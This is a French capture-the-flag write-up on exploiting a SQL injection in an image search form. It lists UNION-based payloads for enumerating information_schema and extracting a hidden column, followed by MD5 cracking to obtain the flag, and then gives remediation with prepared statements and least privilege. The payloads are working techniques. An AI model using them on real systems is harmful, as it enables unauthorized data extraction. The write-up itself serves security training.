# SQL Injection - Image Search

## Description de la faille

Le formulaire de recherche d'images est vulnérable à l'injection SQL. Le paramètre `id` n'est pas correctement validé ni échappé, permettant d'exécuter des requêtes SQL arbitraires et d'extraire des données sensibles de la base de données.

## Exploitation

### 1. Confirmation de la vulnérabilité SQL Injection

**Test basique :**
```sql
1 OR 1=1
```

**Résultat :** Affiche toutes les images au lieu d'une seule → Injection SQL confirmée.

---

### 2. Détermination du nombre de colonnes

**Requête :**
```sql
1 UNION SELECT 1,2
```

**Résultat :** La requête fonctionne → 2 colonnes sont retournées.

**Mapping des colonnes :**
- Colonne 1 → s'affiche dans "Url"
- Colonne 2 → s'affiche dans "Title"

---

### 3. Identification de la base de données

**Requête :**
```sql
1 UNION SELECT database(), 2
```

**Résultat :** `Member_images` → Nom de la base de données actuelle.

---

### 4. Énumération des tables

**Requête :**
```sql
1 UNION SELECT table_name, 2 FROM information_schema.tables
```

**Résultat :** Liste de toutes les tables (système + custom). En scrollant, on trouve les tables custom :
- `users`
- `guestbook`
- `list_images`
- `vote_dbs`
- `db_default`

---

### 5. Raisonnement : Pourquoi cibler list_images ?

#### Tentative d'extraction depuis users

**Requête :**
```sql
1 AND 1=2 UNION SELECT 1, countersign FROM users
```

**Résultat :** Aucune donnée retournée → Blocage.

**Analyse :** La table `users` existe mais ne semble pas accessible depuis la base actuelle.

#### Identification de la table source du formulaire

**Observation :** Le formulaire affiche `ID`, `Title` et `Url` pour chaque image. Ces données proviennent nécessairement d'une table.

**Hypothèse :** Le formulaire de recherche d'images interroge probablement la table `list_images`.

**Vérification des colonnes de list_images :**
```sql
1 AND 1=2 UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573
```

Note : `0x6c6973745f696d61676573` = "list_images" en hexadécimal

**Résultat :** `id,url,title,comment`

**Confirmation :**
- Le formulaire affiche : `id`, `title`, `url`
- La table contient : `id`, `title`, `url`, `comment`
- Les colonnes correspondent → Le formulaire interroge bien `list_images`

**Élément suspect :** La colonne `comment` existe mais n'est pas affichée dans le résultat normal du formulaire. Cela suggère la présence de données cachées.

---

### 6. Extraction des données cachées

**Requête :**
```sql
1 AND 1=2 UNION SELECT id, comment FROM list_images
```

**Résultat :** Extraction de tous les commentaires. Le commentaire de l'image ID 5 révèle :
```
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

---

### 7. Décodage du flag

#### Étape 1 : Décoder le hash MD5
```bash
Hash MD5 : 1928e8083cf461a51303633093573c46
```

Utilisation de CrackStation (https://crackstation.net/) :
```
Résultat : albatroz
```

#### Étape 2 : Conversion en minuscules
```
albatroz → albatroz (déjà en minuscules)
```

#### Étape 3 : Hash SHA256
```bash
echo -n "albatroz" | sha256sum
```

**Flag obtenu :**
```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

---

## Résumé des requêtes SQL essentielles

### Chemin direct vers le flag
```sql
-- 1. Confirmer l'injection
1 OR 1=1

-- 2. Nombre de colonnes
1 UNION SELECT 1,2

-- 3. Identifier les colonnes de list_images
1 AND 1=2 UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573

-- 4. Extraire les commentaires cachés
1 AND 1=2 UNION SELECT id, comment FROM list_images
```

### Requêtes de reconnaissance ayant guidé le raisonnement
```sql
-- Identifier la base de données
1 UNION SELECT database(), 2

-- Lister toutes les tables
1 UNION SELECT table_name, 2 FROM information_schema.tables

-- Tentative sur users (échec)
1 AND 1=2 UNION SELECT 1, countersign FROM users
```

---

## Vulnérabilités identifiées

### 1. SQL Injection (CWE-89)

Le paramètre `id` est directement concaténé dans la requête SQL sans validation ni échappement :

**Code vulnérable (hypothèse) :**
```php
$id = $_GET['id'];
$query = "SELECT id, title, url FROM list_images WHERE id = $id";
```

**Exploitation :**
```
id=1 UNION SELECT 1,2
```

### 2. Information Disclosure

La colonne `comment` contient des données sensibles (instructions pour obtenir le flag) qui ne devraient pas être accessibles via SQL injection.

### 3. Weak Cryptography

Utilisation de MD5 pour stocker le secret. MD5 est obsolète et facilement craquable avec des rainbow tables.

---

## Solution de correction

### 1. Utiliser des requêtes préparées (Prepared Statements)

**Code PHP sécurisé :**
```php
<?php
$id = $_GET['id'];

// Validation : s'assurer que c'est un entier
if (!is_numeric($id)) {
    die("Invalid input");
}

// Requête préparée
$stmt = $mysqli->prepare("SELECT id, title, url FROM list_images WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
$result = $stmt->get_result();

while ($row = $result->fetch_assoc()) {
    echo "ID: " . htmlspecialchars($row['id']) . "<br>";
    echo "Title: " . htmlspecialchars($row['title']) . "<br>";
    echo "Url: " . htmlspecialchars($row['url']) . "<br>";
}

$stmt->close();
?>
```

**Pourquoi c'est sécurisé :**
- Le paramètre `?` est traité comme une **valeur**, jamais comme du code SQL
- `bind_param("i", $id)` force le type entier
- Impossible d'injecter du SQL

---

### 2. Validation des entrées
```php
<?php
// Valider que l'input est un entier positif
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);

if ($id === false || $id < 1) {
    http_response_code(400);
    die("Invalid ID");
}
?>
```

---

### 3. Principe du moindre privilège

Le compte MySQL utilisé par l'application ne devrait avoir accès qu'aux données strictement nécessaires :
```sql
-- Créer un utilisateur avec permissions limitées
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';

-- Donner uniquement SELECT sur list_images
GRANT SELECT ON Member_images.list_images TO 'webapp'@'localhost';

-- Interdire l'accès à information_schema
REVOKE ALL PRIVILEGES ON information_schema.* FROM 'webapp'@'localhost';
```

**Résultat :** Même en cas d'injection SQL, l'attaquant ne peut pas :
- Lire d'autres tables
- Modifier des données
- Accéder à `information_schema`

---

### 4. Supprimer les données sensibles de la base

Les instructions pour obtenir le flag ne devraient pas être stockées dans la base de données de production.

---

### 5. Ne pas utiliser MD5

Remplacer MD5 par des algorithmes modernes (bcrypt, argon2) avec salt :
```php
// Au lieu de MD5
$hash = md5($password); // ❌ Faible

// Utiliser bcrypt
$hash = password_hash($password, PASSWORD_BCRYPT); // ✅ Sécurisé
```

---

## Références

- OWASP: SQL Injection
- OWASP: Top 10 - A03:2021 – Injection
- CWE-89: SQL Injection
- CWE-327: Use of a Broken or Risky Cryptographic Algorithm (MD5)
